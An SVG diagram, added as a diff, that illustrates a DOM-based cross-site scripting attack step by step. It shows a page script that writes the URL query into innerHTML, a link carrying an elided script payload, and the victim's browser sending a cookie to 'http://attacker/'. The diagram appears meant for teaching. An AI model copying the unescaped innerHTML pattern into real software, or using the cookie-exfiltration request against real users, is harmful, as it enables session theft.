@@ -1,0 +1,1110 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Created with Inkscape (http://www.inkscape.org/) -->
+
+<svg
+   xmlns:dc="http://purl.org/dc/elements/1.1/"
+   xmlns:cc="http://creativecommons.org/ns#"
+   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+   xmlns:svg="http://www.w3.org/2000/svg"
+   xmlns="http://www.w3.org/2000/svg"
+   xmlns:xlink="http://www.w3.org/1999/xlink"
+   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
+   version="1.1"
+   width="1203.4978"
+   height="768"
+   id="svg4143"
+   inkscape:version="0.48.4 r9939"
+   sodipodi:docname="dom-based-xss.svg">
+  <metadata
+     id="metadata4255">
+    <rdf:RDF>
+      <cc:Work
+         rdf:about="">
+        <dc:format>image/svg+xml</dc:format>
+        <dc:type
+           rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
+        <dc:title></dc:title>
+      </cc:Work>
+    </rdf:RDF>
+  </metadata>
+  <sodipodi:namedview
+     pagecolor="#ffffff"
+     bordercolor="#666666"
+     borderopacity="1"
+     objecttolerance="10"
+     gridtolerance="10"
+     guidetolerance="10"
+     inkscape:pageopacity="0"
+     inkscape:pageshadow="2"
+     inkscape:window-width="1301"
+     inkscape:window-height="744"
+     id="namedview4253"
+     showgrid="true"
+     inkscape:snap-bbox="true"
+     inkscape:zoom="1.0469264"
+     inkscape:cx="891.07138"
+     inkscape:cy="472.36536"
+     inkscape:window-x="65"
+     inkscape:window-y="24"
+     inkscape:window-maximized="1"
+     inkscape:current-layer="svg4143"
+     fit-margin-top="0"
+     fit-margin-left="0"
+     fit-margin-right="0"
+     fit-margin-bottom="0"
+     showguides="true"
+     inkscape:guide-bbox="true">
+    <inkscape:grid
+       type="xygrid"
+       id="grid4257"
+       empspacing="5"
+       visible="true"
+       enabled="true"
+       snapvisiblegridlinesonly="true"
+       spacingx="16px"
+       spacingy="16px"
+       originx="163.4978px"
+       originy="207.99999px" />
+  </sodipodi:namedview>
+  <defs
+     id="defs4145"><linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="container-gradient">
+      <stop
+         id="stop3318"
+         style="stop-color:hsl(0, 0%, 25%);stop-opacity:1"
+         offset="0" />
+      <stop
+         id="stop3320"
+         style="stop-color:hsl(0, 0%, 5%);stop-opacity:1"
+         offset="1" />
+    </linearGradient>
+    <linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="entity-gradient">
+      <stop
+         id="stop3323"
+         style="stop-color:hsl(0, 0%, 100%);stop-opacity:1"
+         offset="0" />
+      <stop
+         id="stop3325"
+         style="stop-color:hsl(0, 0%, 75%);stop-opacity:1"
+         offset="1" />
+    </linearGradient>
+    <linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="symbol-gradient">
+      <stop
+         style="stop-color:hsl(220, 100%, 50%);stop-opacity:1"
+         offset="0"
+         id="stop4154" />
+      <stop
+         style="stop-color:hsl(220, 100%, 10%);stop-opacity:1"
+         offset="1"
+         id="stop4156" />
+    </linearGradient>
+    <marker
+       refX="-1"
+       markerWidth="3.5"
+       markerHeight="3"
+       orient="auto"
+       viewBox="-1 -1 2.5 2"
+       id="arrowhead">
+      <path
+         d="M -2,-1.25 -2,1.25 1.5,0 z"
+         id="path3428"
+         inkscape:connector-curvature="0" />
+    </marker>
+    <marker
+       refX="-1"
+       markerWidth="3.5"
+       markerHeight="3"
+       orient="auto"
+       viewBox="-1 -1 2.5 2"
+       id="arrowhead-malicious">
+      <path
+         d="M -2,-1.25 -2,1.25 1.5,0 z"
+         id="path4161"
+         inkscape:connector-curvature="0" />
+    </marker>  <style
+       id="style4163">
+      text {
+        font-family: Ubuntu;
+        font-size: 16px;
+        text-align: center;
+        text-anchor: middle;
+      }
+      
+      rect.container {
+        fill: url(#container-gradient);
+        stroke: hsl(0, 0%, 50%);
+        stroke-width: 1px;
+      }
+        
+      text.container, text.container tspan {
+        fill: white;
+        font-weight: bold;
+      }
+      
+      rect.entity {
+        fill: url(#entity-gradient);
+        stroke: hsl(0, 0%, 50%);
+        stroke-width: 1px;
+      }
+      
+      text.code {
+        font-family: &quot;Ubuntu Mono&quot;;
+      }
+      
+      text.left {
+        text-align: left;
+        text-anchor: start;
+      }
+      
+      rect.symbol {
+        fill: url(#symbol-gradient);
+        stroke: hsl(0, 0%, 50%);
+        stroke-width: 1px;
+      }
+      
+      text.symbol {
+        fill: white;
+        font-size: 32px;
+        font-weight: bold;
+      }
+
+      path.arrow {
+        fill: none;
+        stroke: hsl(240, 100%, 50%);
+        stroke: blue;
+        stroke-width: 16px;
+        marker-end: url(#arrowhead);
+      }
+      
+      marker#arrowhead {
+        fill: hsl(240, 100%, 50%);
+      }
+      
+      path.arrow.malicious {
+        stroke: hsl(0, 100%, 50%);
+        stroke: red;
+        marker-end: url(#arrowhead-malicious);
+      }
+      
+      marker#arrowhead-malicious {
+        fill: hsl(0, 100%, 50%);
+      }
+      
+      text.malicious, tspan.malicious {
+        fill: hsl(0, 100%, 50%);
+        font-weight: bold;
+      }
+      
+      tspan.string {
+        fill: hsl(220, 100%, 50%);
+      }
+    </style>
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4295"
+       x1="272"
+       y1="64"
+       x2="272"
+       y2="112"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4297"
+       x1="272"
+       y1="380.36218"
+       x2="272"
+       y2="428.36218"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4299"
+       x1="336"
+       y1="444.36218"
+       x2="336"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-16)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4301"
+       x1="336"
+       y1="380.36218"
+       x2="336"
+       y2="428.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-16)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4303"
+       x1="272"
+       y1="444.36218"
+       x2="272"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-16)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient4898"
+       x1="0"
+       y1="52.181507"
+       x2="0"
+       y2="243.51369"
+       gradientTransform="scale(1.0871146,0.91986621)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4900"
+       x1="8.4257174"
+       y1="183.9505"
+       x2="8.4257174"
+       y2="275.83005"
+       gradientTransform="scale(1.914157,0.52242319)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4902"
+       x1="8.3557272"
+       y1="306.37668"
+       x2="8.3557272"
+       y2="398.28967"
+       gradientTransform="scale(1.9148542,0.52223297)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient4904"
+       x1="0"
+       y1="1075.2653"
+       x2="0"
+       y2="1419.1722"
+       gradientTransform="matrix(1.5352989,0,0,0.65133895,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4906"
+       x1="9.1613541"
+       y1="1317.4574"
+       x2="9.1613541"
+       y2="1599.13"
+       gradientTransform="matrix(1.7604542,0,0,0.56803522,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient4908"
+       x1="431.50897"
+       y1="3.3965109e-06"
+       x2="431.50897"
+       y2="394.52249"
+       gradientTransform="matrix(1.2977714,0,0,0.77055175,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4910"
+       x1="257.68677"
+       y1="107.31694"
+       x2="257.68677"
+       y2="321.95081"
+       gradientTransform="matrix(2.2357694,0,0,0.44727332,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4912"
+       x1="297.44513"
+       y1="309.83868"
+       x2="297.44513"
+       y2="557.70959"
+       gradientTransform="matrix(1.9364917,0,0,0.51639778,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4914"
+       x1="272"
+       y1="64"
+       x2="272"
+       y2="112"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-1)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4916"
+       x1="272"
+       y1="380.36218"
+       x2="272"
+       y2="428.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-1)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4918"
+       x1="336"
+       y1="444.36218"
+       x2="336"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-1)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4920"
+       x1="336"
+       y1="380.36218"
+       x2="336"
+       y2="428.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-1)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4922"
+       x1="272"
+       y1="444.36218"
+       x2="272"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(0,-1)" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#entity-gradient"
+       id="linearGradient4924"
+       x1="134.99998"
+       y1="320"
+       x2="134.99998"
+       y2="416"
+       gradientTransform="matrix(2,0,0,0.5,0,-1)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient3416"
+       x1="0"
+       y1="53.26862"
+       x2="0"
+       y2="244.60078"
+       gradientTransform="matrix(1.0871146,0,0,0.91986619,4.8071289e-6,5.1757814e-7)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient3437"
+       x1="336"
+       y1="444.36218"
+       x2="336"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient3457"
+       x1="431.50897"
+       y1="3.3965109e-06"
+       x2="431.50897"
+       y2="394.52249"
+       gradientTransform="scale(1.2977714,0.77055175)"
+       gradientUnits="userSpaceOnUse" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient3574"
+       x1="272"
+       y1="444.36218"
+       x2="272"
+       y2="492.36218"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(-83.497807,-119.00003)" />
+    <linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="symbol-gradient-6">
+      <stop
+         offset="0"
+         id="stop4154-8" />
+      <stop
+         offset="1"
+         id="stop4156-3" />
+    </linearGradient>
+    <linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="linearGradient3693">
+      <stop
+         offset="0"
+         id="stop3695" />
+      <stop
+         offset="1"
+         id="stop3697" />
+    </linearGradient>
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient3803"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(-123.49779,-119.00002)"
+       x1="336"
+       y1="380.36218"
+       x2="336"
+       y2="428.36218" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4351"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(-409.81934,142.50401)"
+       x1="336"
+       y1="444.36218"
+       x2="336"
+       y2="492.36218" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4383"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(260.25108,-137.496)"
+       x1="272"
+       y1="64"
+       x2="272"
+       y2="112" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient"
+       id="linearGradient4385"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(260.25108,-137.496)"
+       x1="272"
+       y1="380.36218"
+       x2="272"
+       y2="428.36218" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient4481"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="matrix(1.5352989,0,0,0.65133895,-5.1928711e-6,-315.36219)"
+       x1="0"
+       y1="1075.2653"
+       x2="0"
+       y2="1419.1722" />
+    <marker
+       refX="-1"
+       markerWidth="3.5"
+       markerHeight="3"
+       orient="auto"
+       viewBox="-1 -1 2.5 2"
+       id="arrowhead-5">
+      <path
+         d="M -2,-1.25 -2,1.25 1.5,0 z"
+         id="path3428-5"
+         inkscape:connector-curvature="0" />
+    </marker>
+    <linearGradient
+       x1="0"
+       y1="0"
+       x2="0"
+       y2="1"
+       id="symbol-gradient-5">
+      <stop
+         offset="0"
+         id="stop4154-9" />
+      <stop
+         offset="1"
+         id="stop4156-9" />
+    </linearGradient>
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#symbol-gradient-5"
+       id="linearGradient5383"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="translate(344,-107.3622)"
+       x1="336"
+       y1="380.36218"
+       x2="336"
+       y2="428.36218" />
+    <linearGradient
+       inkscape:collect="always"
+       xlink:href="#container-gradient"
+       id="linearGradient5403"
+       gradientUnits="userSpaceOnUse"
+       gradientTransform="matrix(1.2977714,0,0,0.77055176,512.00001,17.000001)"
+       x1="431.50897"
+       y1="3.3965109e-06"
+       x2="431.50897"
+       y2="394.52249" />
+  </defs>
+  <g
+     id="g5387"
+     transform="translate(-512,0)">
+    <rect
+       id="rect2987-7-9"
+       class="container"
+       y="0"
+       x="1203.4978"
+       ry="7.999999"
+       rx="8"
+       height="240"
+       width="512"
+        />
+    <text
+       xml:space="preserve"
+       id="text3011-1-3-0-4"
+       y="32"
+       x="1459.6976"
+       class="container"
+       ><tspan
+         id="tspan3013-4-3-8-7"
+         y="32"
+         x="1459.6976"
+         >Website</tspan></text>
+    <rect
+       id="rect2991-2-2-6-1"
+       y="48"
+       x="1219.4978"
+       ry="8"
+       rx="8"
+       height="176"
+       width="480"
+       class="entity"
+        />
+    <text
+       xml:space="preserve"
+       id="text3011-8-61-0"
+       y="80"
+       x="1459.4205"
+       class="entity"
+       ><tspan
+         id="tspan3013-1-9-9"
+         y="80"
+         x="1459.4205">Website's Response Script</tspan></text>
+    <text
+       sodipodi:linespacing="125%"
+       id="text4519"
+       y="112"
+       x="1235.4978"
+       class="code left"
+       xml:space="preserve"><tspan
+         
+         y="112"
+         x="1235.4978"
+         id="tspan4521"
+         sodipodi:role="line">print <tspan class="string">&quot;&lt;html&gt;&quot;</tspan></tspan><tspan
+         id="tspan4523"
+         
+         y="128"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;You searched for: &lt;em&gt;&lt;/em&gt;&quot;</tspan></tspan><tspan
+         id="tspan4525"
+         
+         y="144"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;&lt;script&gt;&quot;</tspan></tspan><tspan
+         id="tspan4527"
+         
+         y="160"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;var keyword = location.search.substring(6);&quot;</tspan></tspan><tspan
+         id="tspan4529"
+         
+         y="176"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;document.querySelector('em').innerHTML = keyword;&quot;</tspan></tspan><tspan
+         id="tspan4531"
+         
+         y="192"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;&lt;/script&gt;&quot;</tspan></tspan><tspan
+         id="tspan4533"
+         
+         y="208"
+         x="1235.4978"
+         sodipodi:role="line">print <tspan class="string">&quot;&lt;/html&gt;&quot;</tspan></tspan></text>
+  </g>
+  <rect
+     id="rect2987"
+     class="container"
+     y="3.0517578e-05"
+     x="163.49782"
+     ry="8"
+     rx="8"
+     height="111.99999"
+     width="192"
+      />
+  <rect
+     id="rect2991-2"
+     class="entity"
+     y="48.100037"
+     x="179.62596"
+     ry="8"
+     rx="7.9999995"
+     height="48"
+     width="159.87186"
+      />
+  <text
+     xml:space="preserve"
+     id="text3011"
+     y="79.76001"
+     x="259.58362"
+     class="entity"
+     ><tspan
+       id="tspan3013"
+       y="79.76001"
+       x="259.58362">Attacker's Server</tspan></text>
+  <text
+     xml:space="preserve"
+     id="text3011-1-3"
+     y="32.000031"
+     x="267.4968"
+     class="container"
+     ><tspan
+       id="tspan3013-4-3"
+       y="32.000031"
+       x="267.4968"
+       >Attacker</tspan></text>
+  <rect
+     
+     width="528"
+     height="431.99997"
+     rx="8"
+     ry="8"
+     x="163.4978"
+     y="336.00003"
+     class="container"
+     id="rect2987-7" />
+  <text
+     
+     class="container"
+     x="426.98056"
+     y="368.00003"
+     id="text3011-1-3-0"
+     xml:space="preserve"><tspan
+       
+       x="426.98056"
+       y="368.00003"
+       id="tspan3013-4-3-8">Victim's Browser</tspan></text>
+  <path
+     inkscape:connector-curvature="0"
+     id="path3426"
+     d="m 235.4978,112.00003 0,168"
+     class="arrow"
+     
+     sodipodi:nodetypes="cc" />
+  <path
+     inkscape:connector-curvature="0"
+     id="path3426-0"
+     d="m 283.4978,336.00003 0,-184"
+     class="arrow malicious"
+     
+     sodipodi:nodetypes="cc" />
+  <g
+     id="g4342"
+     transform="translate(-26.517455,-53.503999)">
+    <g
+       id="g3745"
+       transform="translate(132.33679,-252.36219)">
+      <rect
+         id="rect3601-8-1-6-0"
+         class="symbol"
+         y="444.36218"
+         x="336"
+         ry="8"
+         rx="8"
+         height="48"
+         width="48"
+          />
+      <text
+         xml:space="preserve"
+         id="text3603-2-0-2-6"
+         y="479.45016"
+         x="360"
+         class="symbol"
+         ><tspan
+           id="tspan3605-4-9-4-5"
+           y="479.45016"
+           x="360">5</tspan></text>
+    </g>
+    <text
+       class="left"
+       xml:space="preserve"
+       id="text4713-9"
+       y="272"
+       x="334.01526"
+       ><tspan
+         id="tspan4715-2"
+         y="272"
+         x="334.01526">GET http://attacker/?cookie=<tspan
+   id="tspan4234"
+   class="malicious"
+   >sensitive-data</tspan></tspan></text>
+  </g>
+  <path
+     inkscape:connector-curvature="0"
+     id="path3426-05"
+     d="m 675.4978,640.00003 280.00004,0 0,-360.00002"
+     class="arrow"
+     
+     sodipodi:nodetypes="ccc" />
+  <path
+     inkscape:connector-curvature="0"
+     id="path3426-05-7"
+     d="m 1003.4978,224.00002 0,464.00001 -272,0"
+     class="arrow"
+     
+     sodipodi:nodetypes="ccc" />
+  <g
+     id="g5251"
+     transform="translate(85.643187,-180.36215)">
+    <g
+       id="g3740"
+       transform="translate(672,240)">
+      <rect
+         id="rect3601-8-1-6"
+         class="symbol"
+         y="444.36218"
+         x="272"
+         ry="8"
+         rx="8"
+         height="48"
+         width="48"
+          />
+      <text
+         xml:space="preserve"
+         id="text3603-2-0-2"
+         y="479.45016"
+         x="296"
+         class="symbol"
+         ><tspan
+           id="tspan3605-4-9-4"
+           y="479.45016"
+           x="296">3</tspan></text>
+    </g>
+    <text
+       xml:space="preserve"
+       id="text4713-9-86"
+       y="764.12219"
+       x="967.59924"
+       ><tspan
+         id="tspan4715-2-8"
+         y="764.12219"
+         x="967.59924">200 OK</tspan></text>
+  </g>
+  <g
+     id="g4369"
+     transform="translate(-13.895135,-53.503999)">
+    <g
+       id="g3727"
+       transform="translate(-176.35596,-188.36219)">
+      <rect
+         id="rect3601"
+         class="symbol"
+         transform="translate(0,316.36218)"
+         y="64"
+         x="272"
+         ry="8"
+         rx="8"
+         height="48"
+         width="48"
+          />
+      <text
+         xml:space="preserve"
+         id="text3603"
+         y="415.45016"
+         x="297.52576"
+         class="symbol"
+         ><tspan
+           id="tspan3605"
+           y="415.45016"
+           x="297.52576">1</tspan></text>
+      <rect
+         id="rect3601-8"
+         class="symbol"
+         y="380.36218"
+         x="272"
+         ry="8"
+         rx="8"
+         height="48"
+         width="48"
+          />
+      <text
+         xml:space="preserve"
+         id="text3603-2"
+         y="415.45016"
+         x="296"
+         class="symbol"
+         ><tspan
+           id="tspan3605-4"
+           y="415.45016"
+           x="296">1</tspan></text>
+    </g>
+    <text
+       sodipodi:linespacing="100%"
+       id="text3528"
+       y="272"
+       x="119.40691"
+       
+       xml:space="preserve"><tspan
+         
+         id="tspan3532"
+         y="272"
+         x="119.40691"
+         sodipodi:role="line">Check this out:</tspan><tspan
+         
+         y="288"
+         x="119.40691"
+         sodipodi:role="line"
+         id="tspan3580">http://website/search?</tspan><tspan
+         id="tspan3556"
+         
+         y="304"
+         x="119.40691"
+         sodipodi:role="line">keyword=<tspan
+   id="tspan3558"
+   
+   class="malicious">&lt;script&gt;...&lt;/script&gt;</tspan></tspan></text>
+  </g>
+  <g
+     transform="translate(459.49779,123.63783)"
+     id="g3735">
+    <rect
+       
+       width="48"
+       height="48"
+       rx="8"
+       ry="8"
+       x="336"
+       y="380.36218"
+       class="symbol"
+       id="rect3601-8-1" />
+    <text
+       
+       class="symbol"
+       x="360"
+       y="415.45016"
+       id="text3603-2-0"
+       xml:space="preserve"><tspan
+         x="360"
+         y="415.45016"
+         id="tspan3605-4-9">2</tspan></text>
+  </g>
+  <text
+     xml:space="preserve"
+     
+     x="819.26068"
+     y="584"
+     id="text3528-4"
+     sodipodi:linespacing="100%"><tspan
+       sodipodi:role="line"
+       x="819.26068"
+       y="584"
+       
+       id="tspan3556-2">GET</tspan><tspan
+       id="tspan3766"
+       sodipodi:role="line"
+       x="819.26068"
+       y="600"
+       >http://website/search?</tspan><tspan
+       id="tspan3768"
+       sodipodi:role="line"
+       x="819.26068"
+       y="616"
+       >keyword=<tspan
+   class="malicious"
+   id="tspan3770"
+   >&lt;script&gt;...&lt;/script&gt;</tspan></tspan></text>
+  <g
+     id="g5269"
+     transform="translate(-1.9287109e-7,192)">
+    <rect
+       id="rect2991-2-2"
+       class="entity"
+       y="384.00003"
+       x="179.62595"
+       ry="8"
+       rx="7.9999995"
+       height="175.99998"
+       width="495.87186"
+        />
+    <text
+       xml:space="preserve"
+       id="text3011-8"
+       y="416.00003"
+       x="427.9325"
+       class="entity"
+       ><tspan
+         id="tspan3013-1"
+         y="416.00003"
+         x="427.9325">Website's Response to Victim</tspan></text>
+    <text
+       sodipodi:linespacing="125%"
+       id="text4519-9"
+       y="448"
+       x="195.4978"
+       class="code left"
+       xml:space="preserve"><tspan
+         id="tspan4533-7"
+         
+         y="448"
+         x="195.4978"
+         sodipodi:role="line">&lt;html&gt;</tspan><tspan
+         id="tspan5161"
+         
+         y="464"
+         x="195.4978"
+         sodipodi:role="line">You searched for: &lt;em&gt;&lt;/em&gt;</tspan><tspan
+         id="tspan5163"
+         
+         y="480"
+         x="195.4978"
+         sodipodi:role="line">&lt;script&gt;</tspan><tspan
+         id="tspan5165"
+         
+         y="496"
+         x="195.4978"
+         sodipodi:role="line">var keyword = location.search.substring(6);</tspan><tspan
+         id="tspan5167"
+         
+         y="512"
+         x="195.4978"
+         sodipodi:role="line">document.querySelector('em').innerHTML = keyword;</tspan><tspan
+         id="tspan5169"
+         
+         y="528"
+         x="195.4978"
+         sodipodi:role="line">&lt;/script&gt;</tspan><tspan
+         id="tspan5171"
+         
+         y="544"
+         x="195.4978"
+         sodipodi:role="line">&lt;/html&gt;</tspan></text>
+  </g>
+  <g
+     id="g5232"
+     transform="translate(4.6142578e-6,-191.99997)">
+    <rect
+       id="rect2991-2-2-2"
+       class="entity"
+       y="576"
+       x="179.4978"
+       ry="8"
+       rx="7.9999995"
+       height="175.99998"
+       width="495.87186"
+        />
+    <text
+       xml:space="preserve"
+       id="text3011-8-8"
+       y="608"
+       x="427.80435"
+       class="entity"
+       ><tspan
+         id="tspan3013-1-1"
+         y="608"
+         x="427.80435">Website's Response to Victim After <tspan class="code">innerHTML</tspan> Manipulation</tspan></text>
+    <text
+       sodipodi:linespacing="125%"
+       id="text4519-9-6"
+       y="640"
+       x="195.36964"
+       class="code left"
+       xml:space="preserve"><tspan
+         id="tspan4533-7-4"
+         
+         y="640"
+         x="195.36964"
+         sodipodi:role="line">&lt;html&gt;</tspan><tspan
+         id="tspan5161-8"
+         
+         y="656"
+         x="195.36964"
+         sodipodi:role="line">You searched for: &lt;em&gt;<tspan
+   
+   id="tspan5385"
+   class="malicious">&lt;script&gt;...&lt;/script&gt;</tspan>&lt;/em&gt;</tspan><tspan
+         id="tspan5163-6"
+         
+         y="672"
+         x="195.36964"
+         sodipodi:role="line">&lt;script&gt;</tspan><tspan
+         id="tspan5165-8"
+         
+         y="688"
+         x="195.36964"
+         sodipodi:role="line">var keyword = location.search.substring(6);</tspan><tspan
+         id="tspan5167-0"
+         
+         y="704"
+         x="195.36964"
+         sodipodi:role="line">document.querySelector('em').innerHTML = keyword;</tspan><tspan
+         id="tspan5169-2"
+         
+         y="720"
+         x="195.36964"
+         sodipodi:role="line">&lt;/script&gt;</tspan><tspan
+         id="tspan5171-7"
+         
+         y="736"
+         x="195.36964"
+         sodipodi:role="line">&lt;/html&gt;</tspan></text>
+  </g>
+  <path
+     inkscape:connector-curvature="0"
+     id="path3426-05-5"
+     d="m 179.4978,664.00001 -96,0 0,-192 40,0"
+     class="arrow"
+     
+     sodipodi:nodetypes="cccc" />
+  <g
+     id="g5378"
+     transform="translate(-8.000001,112.00001)">
+    <rect
+       
+       width="48"
+       height="48"
+       rx="8"
+       ry="8"
+       x="19.497801"
+       y="432"
+       class="symbol"
+       id="rect3601-8-1-9" />
+    <text
+       
+       class="symbol"
+       x="43.497799"
+       y="467.08798"
+       id="text3603-2-0-7"
+       xml:space="preserve"><tspan
+         x="43.497799"
+         y="467.08798"
+         id="tspan3605-4-9-0">4</tspan></text>
+  </g>
+</svg>
